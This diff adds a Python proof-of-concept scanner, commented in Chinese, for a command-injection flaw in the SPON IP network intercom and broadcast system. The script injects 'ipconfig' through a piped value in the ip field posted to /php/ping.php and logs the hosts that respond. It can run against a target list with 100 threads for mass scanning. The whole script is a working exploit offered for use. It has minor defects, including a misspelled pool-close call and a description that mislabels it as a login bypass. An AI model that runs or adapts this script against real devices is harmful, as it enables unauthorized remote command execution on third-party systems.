@@ -1,0 +1,84 @@
+# SPON IP网络对讲广播系统RCE
+# -*- coding : utf-8 -*-
+import argparse,sys,requests
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()  # 校验证书错的时候防止他报错
+
+def banner():
+    test = """
+
+
+ ██░ ██  ▄▄▄       ███▄    █ ▓█████▄      ██████  ██▀███   ███▄ ▄███▓   ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄████▄   ▄▄▄     ▄▄▄█████▓      ▄▄▄██▀▀▀██████  ██▓███  
+▓██░ ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌   ▒██    ▒ ▓██ ▒ ██▒▓██▒▀█▀ ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒        ▒██ ▒██    ▒ ▓██░  ██▒
+▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌   ░ ▓██▄   ▓██ ░▄█ ▒▓██    ▓██░   ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░        ░██ ░ ▓██▄   ▓██░ ██▓▒
+░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌     ▒   ██▒▒██▀▀█▄  ▒██    ▒██    ░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░      ▓██▄██▓  ▒   ██▒▒██▄█▓▒ ▒
+░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒████▓    ▒██████▒▒░██▓ ▒██▒▒██▒   ░██▒     ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░  ██▓  ▓███▒ ▒██████▒▒▒██▒ ░  ░
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒    ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░    ▒▓▒  ▒▓▒▒░ ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░
+ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒    ░ ░▒  ░ ░  ░▒ ░ ▒░░  ░      ░       ░      ░ ▒ ▒░ ░  ░      ░  ░  ▒     ▒   ▒▒ ░   ░     ░▒   ▒ ░▒░ ░ ░▒  ░ ░░▒ ░     
+ ░  ░░ ░  ░   ▒      ░   ░ ░  ░ ░  ░    ░  ░  ░    ░░   ░ ░      ░        ░      ░ ░ ░ ▒  ░      ░   ░          ░   ▒    ░       ░    ░ ░ ░ ░  ░  ░  ░░       
+ ░  ░  ░      ░  ░         ░    ░             ░     ░            ░                   ░ ░         ░   ░ ░            ░  ░          ░   ░   ░       ░           
+                              ░                                                                      ░                            ░                           
+
+                                                                                            tag:   SPON IP网络对讲广播系统RCE
+                                                                                            version:  0.1           author: shmily                                   
+
+"""
+    
+    print(test)
+
+def poc(target):
+    url = target + "/php/ping.php"
+    headers = {
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "zh-CN,zh;q=0.9",
+            "Connection": "close",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "40"
+    }
+    try:
+        data = "jsondata[ip]=a|ipconfig&jsondata[type]=1"
+        res = requests.post(url=url,headers=headers,verify=False,data=data).text
+        if "IPv4" in res:
+            print("[+]"+ target +"当前漏洞可以利用")
+            with open('w.txt','a',encoding='utf-8') as f:
+                f.write(target+"当前漏洞可以利用\n")
+        else:
+            print("[-]"+target+"当前漏洞不可以利用")
+    except:
+        print("一个错误的url")
+    
+
+def main():
+    banner()
+    """命令行接收参数"""
+    parser = argparse.ArgumentParser(description="This is login bypass vulnerability script")
+    # -u 单个检测 -f 多行检测
+    parser.add_argument('-u','--url',dest='url',help="input attack url",type=str)
+    parser.add_argument('-f','--file',dest='file',help="data.txt",type=str)
+    #调用
+    args = parser.parse_args()
+    #是处理命令行参数的
+    #做了一个循环判断
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.colse()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+    """这个就是关于多线程的操作"""
+
+#主函数模块
+if __name__ == '__main__':
+    main()
